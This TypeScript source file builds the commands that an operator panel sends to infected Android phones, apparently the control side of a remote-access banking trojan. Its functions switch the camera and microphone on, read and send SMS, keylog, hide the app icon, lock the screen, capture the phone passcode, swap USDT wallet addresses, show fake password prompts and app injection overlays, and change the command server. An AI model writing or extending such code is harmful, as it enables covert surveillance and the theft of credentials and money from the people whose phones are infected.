/**
 * Builds device-protocol payloads that match what the Android app expects.
 * The Java backend is a generic relay (slr_panelsend → device), so the
 * frontend must include the correct `type` and device-level `subc` fields.
 * Mirrors the transformation logic in the old Node websocket-server.js.
 */

export type DevicePayload = Record<string, unknown>;
export type ScreenMovePoint = { x: number; y: number };
export type ScreenMoveType = '0' | '1' | '2';

// ─── slr_panelsend commands (relayed directly to device) ────────────────────

export function buildCam(cam: '0' | '1' = '0'): DevicePayload {
  return { type: 'screencomd', subc: 'Camera', SelectedCam: cam };
}

export function buildCamOff(): DevicePayload {
  return { type: 'screencomd', subc: 'CameraOff' };
}

export function buildMic(): DevicePayload {
  return { type: 'mic', subc: 'ON' };
}

export function buildMicOff(): DevicePayload {
  return { type: 'mic', subc: 'OFF' };
}

export function buildSms(): DevicePayload {
  return { type: 'screencomd', subc: 'SMS' };
}

export function buildSmsSend(
  smsnumber: string,
  message: string,
): DevicePayload {
  return { type: 'screencomd', subc: 'SMSSEND', smsnumber, message };
}

export function buildContacts(): DevicePayload {
  return { type: 'screencomd', subc: 'Contacts' };
}

export function buildLoadApps(): DevicePayload {
  return { type: 'screencomd', subc: 'LOADAPPS' };
}

export function buildKeylog(keylogtype = '0'): DevicePayload {
  return { type: 'screencomd', subc: 'Keylog', comdtype: keylogtype };
}

export function buildLogdate(kdate: string, keylogtype = '0'): DevicePayload {
  return { type: 'screencomd', subc: 'Logdate', comdtype: keylogtype, kdate };
}

export function buildPermissions(prim: string): DevicePayload {
  return { type: 'Permissions', subc: 'R', prim };
}

export function buildHideico(): DevicePayload {
  return { type: 'screencomd', subc: 'Hideico' };
}

export function buildOpenApp(packageName: string): DevicePayload {
  return { type: 'screencomd', subc: 'OPENAPP', package: packageName };
}

export function buildRename(name: string): DevicePayload {
  return { type: 'screencomd', subc: 'Rename', name };
}

export function buildLoc(): DevicePayload {
  return { type: 'screencomd', subc: 'Location' };
}

export function buildLocOff(): DevicePayload {
  return { type: 'screencomd', subc: 'Locationoff' };
}

// Activity-type commands: subc "L" = load, "D" = delete
const activitySubcMap: Record<string, { D: string; L: string }> = {
  activz: { L: 'GA', D: 'DA' },
  notifys: { L: 'GF', D: 'DF' },
  vapps: { L: 'GV', D: 'DV' },
  vlinks: { L: 'GU', D: 'DU' },
};

export function buildActivity(
  cmd: 'activz' | 'notifys' | 'vapps' | 'vlinks',
  mode: 'D' | 'L',
  kdate?: string,
): DevicePayload {
  // oxlint-disable-next-line no-non-null-assertion
  const map = activitySubcMap[cmd]!;
  return { type: 'Activitys', subc: map[mode], ...(kdate ? { kdate } : {}) };
}

// Proxy: ON/OFF
export function buildProxy(on: boolean): DevicePayload {
  return { type: 'proxy', subc: on ? '1' : '0' };
}

// Broadcast
export function buildBroadcast(params: {
  act: 'nothing' | 'openApp' | 'openLink';
  alertico?: string;
  comand: 'alert' | 'notify';
  msg: string;
  title: string;
  todo: string;
}): DevicePayload {
  const actMap: Record<string, string> = {
    nothing: '0',
    openApp: '1',
    openLink: '2',
  };
  if (params.comand === 'alert') {
    return {
      type: 'bc',
      subc: 'A',
      thetitle: params.title,
      themsg: params.msg,
      toopen: params.todo,
      theype: actMap[params.act],
      ico: params.alertico || '',
    };
  }
  return {
    type: 'bc',
    subc: 'N',
    thetitle: params.title,
    themsg: params.msg,
    toopen: params.todo,
    theype: actMap[params.act],
  };
}

// ─── Screen commands (type: "screen") ───────────────────────────────────────
// These map the SCREEN_COMMANDS `comand` field to device-protocol format.

export function buildScreenLock(lockit: string): DevicePayload {
  return { type: 'screen', subc: 'L', lock: lockit };
}

export function buildScreenBlock(bstate: string, color = '0'): DevicePayload {
  return { type: 'screen', subc: 'block', blockstate: bstate, color };
}

export function buildScreenNav(nav: string): DevicePayload {
  return { type: 'screen', subc: 'nav', nav };
}

export function buildScreenVol(volstate: string): DevicePayload {
  return { type: 'screen', subc: 'vol', volstate };
}

export function buildScreenKb(kbstate: string): DevicePayload {
  return { type: 'screen', subc: 'kb', kbstate };
}

export function buildScreenSnap(stype: '0' | '1' = '1'): DevicePayload {
  return { type: 'screen', subc: 'snap', snaptype: stype };
}

export function buildScreenStream(comdtype: string): DevicePayload {
  return { type: 'screencomd', subc: 'Screen', comdtype };
}

export function buildScreenMove(
  movetype: ScreenMoveType,
  poi: ScreenMovePoint | string,
): DevicePayload {
  return { type: 'screen', subc: 'mov', movetype, poi };
}

export function buildScreenPaste(txt: string): DevicePayload {
  return { type: 'screen', subc: 'paste', txt };
}

export function buildScreenPhonepass(
  passtype: string,
  phonepass: string,
): DevicePayload {
  return { type: 'screen', subc: 'phonepass', passtype, phonepass };
}

export function buildScreenUsdt(usdttype: string): DevicePayload {
  return { type: 'screen', subc: 'usdt', usdttype };
}

export function buildScreenUsdtAddress(addr: string): DevicePayload {
  return { type: 'screen', subc: 'usdtadress', usdtadresstext: addr };
}

export function buildScreenQuality(q: string): DevicePayload {
  return { type: 'screen', subc: 'Q', newq: q };
}

export function buildScreenBlockd(blocktext: string): DevicePayload {
  return { type: 'screen', subc: 'blockd', blocktext };
}

export function buildPasswordPhish(params: {
  lckdis: string;
  pin?: string;
  title: string;
  typ: string;
}): DevicePayload {
  return {
    type: 'screencomd',
    subc: 'DIAO',
    pin: params.pin || '',
    title: params.title,
    lckdis: params.lckdis,
    typ: params.typ,
  };
}

// ─── File management commands ─────────────────────────────────────────────

export function buildFilesBrowse(filepath: string): DevicePayload {
  return { type: 'screencomd', subc: 'files', filepath };
}

export function buildFileUpload(params: {
  comdtype: string;
  content: string;
  filename: string;
  filepath: string;
  filetype: string;
  isinjct?: string;
  jctid?: string;
  size: string;
}): DevicePayload {
  return {
    type: 'screencomd',
    subc: 'changefiles',
    comdtype: params.comdtype,
    filepath: params.filepath,
    filetype: params.filetype,
    filename: params.filename,
    size: params.size,
    content: params.content,
    ...(params.isinjct ? { isinjct: params.isinjct } : {}),
    ...(params.jctid ? { jctid: params.jctid } : {}),
  };
}

export function buildFileDelete(): DevicePayload {
  return { type: 'Delete', subc: '[reme]' };
}

export function buildFileView(filepath: string): DevicePayload {
  return { type: 'screencomd', subc: 'viewfile', filepath };
}

export function buildFileRename(name: string): DevicePayload {
  return { type: 'screencomd', subc: 'Rename', name };
}

export function buildFileCopyCut(
  state: string,
  tp: string,
  fp: string,
): DevicePayload {
  return { type: 'file', subc: state, tpath: tp, fpath: fp };
}

// ─── Search command ───────────────────────────────────────────────────────

export function buildSearch(
  srchfor: string,
  srchin: string,
  targetpath?: string,
): DevicePayload {
  return {
    type: 'srh',
    subc: srchin,
    Tpath: targetpath || 'null',
    sfor: srchfor,
  };
}

// ─── Change server command ────────────────────────────────────────────────

export function buildChangeServer(
  domain: string,
  ip: string,
  changeid: string,
): DevicePayload {
  return { type: 'screencomd', subc: 'change', domain, ip, changeid };
}

// ─── Notify command ───────────────────────────────────────────────────────

export function buildNotify(noti: string): DevicePayload {
  return { type: 'Notifi', noti };
}

// ─── Display command ──────────────────────────────────────────────────────

export function buildDisplay(display: string): DevicePayload {
  return { type: 'screencomd', subc: 'display', display };
}

// ─── Open injection ──────────────────────────────────────────────────────

export function buildOpenInjection(title?: string, message?: string): DevicePayload {
  const payload: DevicePayload = { type: 'screencomd', subc: 'OPENINJ' };
  if (title) payload.title = title;
  if (message) payload.message = message;
  return payload;
}

// ─── Uninstall app ───────────────────────────────────────────────────────

export function buildUninstallApp(packageName: string): DevicePayload {
  return { type: 'screencomd', subc: 'UNINSTALLAPP', package: packageName };
}

// ─── Get injection records ───────────────────────────────────────────────

export function buildGetInjApps(): DevicePayload {
  return { type: 'screencomd', subc: 'OPENINJ' };
}

// ─── Change server ────────────────────────────────────────────────────────

export function buildNoInject(jctid: string): DevicePayload {
  return { type: 'screencomd', subc: 'noinj', jctid };
}
